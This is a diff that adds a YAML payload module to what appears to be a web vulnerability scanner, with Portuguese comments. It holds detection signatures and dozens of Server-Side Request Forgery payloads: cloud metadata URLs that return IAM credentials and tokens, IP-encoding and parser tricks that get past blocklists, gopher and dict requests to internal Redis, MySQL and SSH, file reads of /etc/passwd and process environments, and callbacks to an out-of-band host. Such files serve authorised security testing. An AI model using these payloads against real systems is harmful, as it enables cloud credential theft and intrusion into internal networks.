@@ -1,0 +1,121 @@
+name: ssrf
+description: Server-Side Request Forgery (OOB, metadados cloud, bypass de IP e protocolos)
+detectors: [oob, signature, diff]
+diff_len_ratio: 0.50
+
+transforms:
+  - raw
+  - url
+  - url_double
+
+# metadados cloud e leitura interna refletidos no corpo
+signatures:
+  - 'ami-id'
+  - 'instance-id'
+  - 'instance-action'
+  - 'iam/security-credentials'
+  - 'AccessKeyId'
+  - 'SecretAccessKey'
+  - 'availability-zone'
+  - 'local-hostname'
+  - 'public-keys'
+  - 'ComputeMetadata'
+  - 'metadata.*flavor'
+  - 'securityGroups'
+  - 'accountId'
+  - 'privateIp'
+  - 'root:.*:0:0:'       # file:///etc/passwd
+  - 'SSH-2.0-'           # banner de serviço interno via gopher/dict
+
+payloads:
+  # --- OOB direto (confirma SSRF cego) ---
+  - { value: '{OOBURL}', tags: [oob], oob: true }
+  - { value: 'http://{OOBHOST}', tags: [oob], oob: true }
+  - { value: 'https://{OOBHOST}', tags: [oob], oob: true }
+  - { value: '//{OOBHOST}', tags: [oob, schemeless], oob: true }
+  # --- metadados AWS/GCP/Azure/Alibaba ---
+  - { value: 'http://169.254.169.254/latest/meta-data/', tags: [aws, metadata] }
+  - { value: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', tags: [aws, metadata, creds] }
+  - { value: 'http://169.254.169.254/latest/user-data/', tags: [aws, metadata] }
+  - { value: 'http://metadata.google.internal/computeMetadata/v1/', tags: [gcp, metadata] }
+  - { value: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', tags: [gcp, metadata, creds] }
+  - { value: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', tags: [azure, metadata] }
+  - { value: 'http://100.100.100.200/latest/meta-data/', tags: [alibaba, metadata] }
+  # --- alvos internos padrão ---
+  - { value: 'http://127.0.0.1/', tags: [internal] }
+  - { value: 'http://127.0.0.1:80/', tags: [internal] }
+  - { value: 'http://127.0.0.1:22/', tags: [internal, portscan] }
+  - { value: 'http://localhost/', tags: [internal] }
+  - { value: 'http://0.0.0.0/', tags: [internal] }
+  # --- bypass de blacklist 127.0.0.1 (encoding de IP) ---
+  - { value: 'http://2130706433/', tags: [bypass, decimal] }
+  - { value: 'http://0x7f000001/', tags: [bypass, hex] }
+  - { value: 'http://0x7f.0x0.0x0.0x1/', tags: [bypass, hex] }
+  - { value: 'http://0177.0.0.1/', tags: [bypass, octal] }
+  - { value: 'http://0177.0.0.01/', tags: [bypass, octal] }
+  - { value: 'http://127.1/', tags: [bypass, shorthand] }
+  - { value: 'http://127.0.1/', tags: [bypass, shorthand] }
+  - { value: 'http://[::1]/', tags: [bypass, ipv6] }
+  - { value: 'http://[0:0:0:0:0:ffff:127.0.0.1]/', tags: [bypass, ipv6] }
+  - { value: 'http://[::ffff:127.0.0.1]/', tags: [bypass, ipv6] }
+  # --- bypass de blacklist 169.254.169.254 ---
+  - { value: 'http://2852039166/latest/meta-data/', tags: [aws, bypass, decimal] }
+  - { value: 'http://0xa9fea9fe/latest/meta-data/', tags: [aws, bypass, hex] }
+  - { value: 'http://[::ffff:169.254.169.254]/latest/meta-data/', tags: [aws, bypass, ipv6] }
+  - { value: 'http://169.254.169.254.nip.io/latest/meta-data/', tags: [aws, bypass, dns] }
+  # --- bypass por parser confusion (@, #, credenciais) ---
+  - { value: 'http://127.0.0.1#@evil', tags: [bypass, parser] }
+  - { value: 'http://expected.com@127.0.0.1/', tags: [bypass, parser] }
+  - { value: 'http://127.0.0.1%2523@evil.com/', tags: [bypass, parser] }
+  - { value: 'http://localhost%23.evil.com/', tags: [bypass, parser] }
+  # --- protocolos alternativos ---
+  - { value: 'file:///etc/passwd', tags: [file] }
+  - { value: 'gopher://{OOBHOST}/_SSRF', tags: [gopher, oob], oob: true }
+  - { value: 'dict://{OOBHOST}:11211/stats', tags: [dict, oob], oob: true }
+  - { value: 'ftp://{OOBHOST}/', tags: [ftp, oob], oob: true }
+  - { value: 'ldap://{OOBHOST}:389/', tags: [ldap, oob], oob: true }
+  # --- redirect-based (segue redirect p/ interno) ---
+  - { value: 'http://{OOBHOST}/redirect?to=http://169.254.169.254/', tags: [redirect, oob], oob: true }
+  # --- metadados extras (paths detalhados) ---
+  - { value: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin', tags: [aws, creds] }
+  - { value: 'http://169.254.169.254/latest/api/token', tags: [aws, imdsv2] }
+  - { value: 'http://169.254.169.254/latest/dynamic/instance-identity/document', tags: [aws] }
+  - { value: 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/', tags: [gcp] }
+  - { value: 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token', tags: [gcp, creds] }
+  - { value: 'http://169.254.169.254/metadata/v1/', tags: [digitalocean] }
+  - { value: 'http://169.254.169.254/openstack/latest/meta_data.json', tags: [openstack] }
+  - { value: 'http://100.100.100.200/latest/meta-data/ram/security-credentials/', tags: [alibaba, creds] }
+  - { value: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', tags: [azure, creds] }
+  # --- bypass de IP extras ---
+  - { value: 'http://0/', tags: [bypass, zero] }
+  - { value: 'http://0.0.0.0:80/', tags: [bypass] }
+  - { value: 'http://[::]/', tags: [bypass, ipv6] }
+  - { value: 'http://[::ffff:a9fe:a9fe]/', tags: [aws, bypass, ipv6] }
+  - { value: 'http://①②⑦.⓪.⓪.①/', tags: [bypass, unicode] }
+  - { value: 'http://127。0。0。1/', tags: [bypass, ideographic] }
+  - { value: 'http://127.0.0.1%00/', tags: [bypass, null] }
+  - { value: 'http://127.0.0.1:80@evil.com/', tags: [bypass, parser] }
+  - { value: 'http://evil.com\\@127.0.0.1/', tags: [bypass, parser] }
+  - { value: 'http://127.0.0.1./', tags: [bypass, trailing-dot] }
+  - { value: 'http://localtest.me/', tags: [bypass, dns] }
+  - { value: 'http://customer1.app.localhost.my.company.127.0.0.1.nip.io/', tags: [bypass, dns] }
+  - { value: 'http://spoofed.burpcollaborator.net/', tags: [bypass, rebind] }
+  - { value: 'http://0x7f000001/', tags: [bypass, hex] }
+  - { value: 'http://017700000001/', tags: [bypass, octal-full] }
+  - { value: 'http://3232235521/', tags: [bypass, decimal-priv] }
+  # --- protocolos / smuggling extras ---
+  - { value: 'gopher://127.0.0.1:6379/_INFO%0d%0a', tags: [gopher, redis] }
+  - { value: 'gopher://127.0.0.1:3306/_', tags: [gopher, mysql] }
+  - { value: 'dict://127.0.0.1:6379/INFO', tags: [dict, redis] }
+  - { value: 'dict://127.0.0.1:22/', tags: [dict, ssh] }
+  - { value: 'sftp://{OOBHOST}/', tags: [sftp, oob], oob: true }
+  - { value: 'tftp://{OOBHOST}/a', tags: [tftp, oob], oob: true }
+  - { value: 'netdoc:///etc/passwd', tags: [java, netdoc] }
+  - { value: 'jar:http://{OOBHOST}!/', tags: [java, jar, oob], oob: true }
+  - { value: 'file:///proc/self/environ', tags: [file] }
+  - { value: 'file:///c:/windows/win.ini', tags: [file, windows] }
+  # --- OOB extras (schemes) ---
+  - { value: 'https://{OOBHOST}/', tags: [oob], oob: true }
+  - { value: 'http://{OOBHOST}:80/', tags: [oob], oob: true }
+  - { value: 'http://{OOBHOST}:443/', tags: [oob], oob: true }
+  - { value: '//{OOBHOST}/%2f%2e%2e', tags: [oob, schemeless], oob: true }
